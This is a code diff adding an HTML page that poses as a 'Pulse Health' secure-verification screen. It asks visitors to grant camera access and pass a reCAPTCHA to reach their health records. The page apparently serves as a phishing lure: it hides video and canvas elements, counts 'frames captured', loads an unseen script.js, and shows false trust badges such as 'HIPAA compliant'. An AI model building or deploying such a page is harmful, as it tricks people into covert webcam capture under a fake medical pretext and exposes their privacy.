@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pulse Health — Secure verify</title>
+<link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400;9..144,500;9..144,600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+<script>
+  window.__recaptchaReady = false;
+  window.__cameraReady    = false;
+  window.onRecaptchaLoad = function () {
+    window.__recaptchaReady = true;
+    if (window.__tryRenderRecaptcha) window.__tryRenderRecaptcha();
+  };
+</script>
+<script src="https://www.google.com/recaptcha/api.js?onload=onRecaptchaLoad&render=explicit" async defer></script>
+
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;}
+  :root{
+    --bg:#faf9f6; --paper:#fff; --ink:#1a2e29; --muted:#7a8a85;
+    --line:#e8e4dc; --line-2:#f2efe9;
+    --teal:#2d6a5c; --teal-soft:#e8f3ef; --mint:#d1e8de;
+  }
+  html,body{height:100%;}
+  body{
+    font-family:'Inter',sans-serif; background:var(--bg); color:var(--ink);
+    min-height:100vh; display:flex; flex-direction:column;
+    -webkit-font-smoothing:antialiased; letter-spacing:-0.01em;
+    background-image:radial-gradient(600px 400px at 85% 5%, rgba(209,232,222,0.35), transparent 60%);
+  }
+  .nav{padding:20px 44px; display:flex; justify-content:space-between; align-items:center;}
+  .logo{display:flex; align-items:center; gap:11px; font-family:'Fraunces',serif; font-size:21px;}
+  .logo-mark{
+    width:32px; height:32px; border-radius:50%;
+    background:linear-gradient(135deg, var(--mint), var(--teal));
+    display:flex; align-items:center; justify-content:center;
+    box-shadow:0 4px 14px rgba(45,106,92,0.22);
+  }
+  .logo-mark svg{width:16px; height:16px; stroke:#fff; stroke-width:2.5; fill:none;}
+  .logo em{font-style:italic; color:var(--teal);}
+  .chip{
+    padding:7px 13px; font-size:12px; font-weight:600;
+    color:var(--teal); background:var(--teal-soft); border-radius:999px;
+  }
+  .stage{flex:1; display:flex; align-items:center; justify-content:center; padding:48px 22px;}
+  .card{
+    width:100%; max-width:460px; background:var(--paper); border-radius:28px;
+    padding:44px 40px 40px;
+    box-shadow:0 2px 6px rgba(45,106,92,0.04), 0 20px 50px rgba(45,106,92,0.08);
+  }
+  .card-head{text-align:center; margin-bottom:32px;}
+  .badge-soft{
+    width:64px; height:64px; margin:0 auto 22px; border-radius:50%;
+    background:var(--teal-soft); display:flex; align-items:center; justify-content:center;
+  }
+  .badge-soft svg{width:26px; height:26px; stroke:var(--teal); stroke-width:1.8; fill:none;}
+  .card-head h1{font-family:'Fraunces',serif; font-size:28px; font-weight:500; letter-spacing:-0.03em; margin-bottom:10px;}
+  .card-head h1 em{font-style:italic; color:var(--teal);}
+  .card-head p{font-size:14.5px; color:var(--muted); line-height:1.6;}
+  .cam-panel{
+    padding:20px; background:#f5f3ee; border-radius:18px; margin-bottom:20px;
+    transition:all .35s; display:flex; gap:14px; align-items:center;
+  }
+  .cam-panel.active{background:var(--teal-soft);}
+  .cam-panel .ic{
+    width:44px; height:44px; border-radius:14px; background:#fff;
+    color:var(--muted); display:flex; align-items:center; justify-content:center;
+    font-size:20px; transition:all .35s;
+  }
+  .cam-panel.active .ic{background:var(--teal); color:#fff;}
+  .cam-panel .txt .t{font-size:14.5px; font-weight:600;}
+  .cam-panel .txt .s{font-size:12.5px; color:var(--muted); margin-top:3px;}
+  .cam-panel .ck{margin-left:auto; color:var(--teal); font-size:20px; display:none;}
+  .cam-panel.active .ck{display:block;}
+  .stats{display:none; grid-template-columns:1fr 1fr; gap:12px; margin-bottom:20px;}
+  .stat{padding:16px 18px; background:#f5f3ee; border-radius:16px;}
+  .stat .k{font-size:11.5px; color:var(--muted); margin-bottom:6px;}
+  .stat .v{font-family:'Fraunces',serif; font-size:26px; font-weight:500; letter-spacing:-0.02em;}
+  .stat .v.t{color:var(--teal);}
+  .captcha-wrap{
+    padding:18px; background:#f5f3ee; border-radius:18px;
+    display:flex; justify-content:center; transition:all .35s;
+  }
+  .captcha-wrap.ready{background:var(--teal-soft);}
+  #recaptchaWidget{display:inline-block;}
+  .dimmed{opacity:0.35; pointer-events:none; filter:grayscale(0.5);}
+  .footnote{text-align:center; font-size:12px; color:var(--muted); margin-top:20px;}
+  video,canvas{display:none;}
+  .footer{
+    padding:20px 44px; border-top:1px solid var(--line-2);
+    display:flex; justify-content:space-between; font-size:12px; color:var(--muted);
+  }
+  #bottomRight{color:var(--teal); font-weight:600;}
+</style>
+</head>
+<body>
+
+<nav class="nav">
+  <div class="logo">
+    <div class="logo-mark">
+      <svg viewBox="0 0 24 24"><path d="M3 12h4l2-6 4 12 2-6h6" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    </div>
+    Pulse<em>Health</em>
+  </div>
+  <span class="chip">Secure session</span>
+</nav>
+
+<main class="stage">
+  <div class="card">
+    <div class="card-head">
+      <div class="badge-soft">
+        <svg viewBox="0 0 24 24">
+          <path d="M12 2l7 3v6c0 4.5-3 7.5-7 9-4-1.5-7-4.5-7-9V5l7-3z" stroke-linejoin="round"/>
+          <path d="M9 12l2 2 4-4" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <h1>Verify <em>securely</em></h1>
+      <p>Allow camera access and complete the check to access your health records.</p>
+    </div>
+
+    <div class="cam-panel" id="camCard">
+      <div class="ic">📷</div>
+      <div class="txt">
+        <div class="t" id="camTitle">Camera access</div>
+        <div class="s" id="camSub">Waiting for permission…</div>
+      </div>
+      <div class="ck">✓</div>
+    </div>
+
+    <div class="stats" id="stats">
+      <div class="stat"><div class="k">Frames captured</div><div class="v t" id="cntCaptures">0</div></div>
+      <div class="stat"><div class="k">Status</div><div class="v" id="delStatus">✓</div></div>
+    </div>
+
+    <div class="captcha-wrap dimmed" id="captchaWrap">
+      <div id="recaptchaWidget"></div>
+    </div>
+    <p class="footnote">Protected by reCAPTCHA · Privacy · Terms</p>
+  </div>
+</main>
+
+<footer class="footer">
+  <span>Pulse Health · HIPAA compliant</span>
+  <span id="bottomRight">● Secured</span>
+</footer>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script src="script.js"></script>
+</body>
+</html>
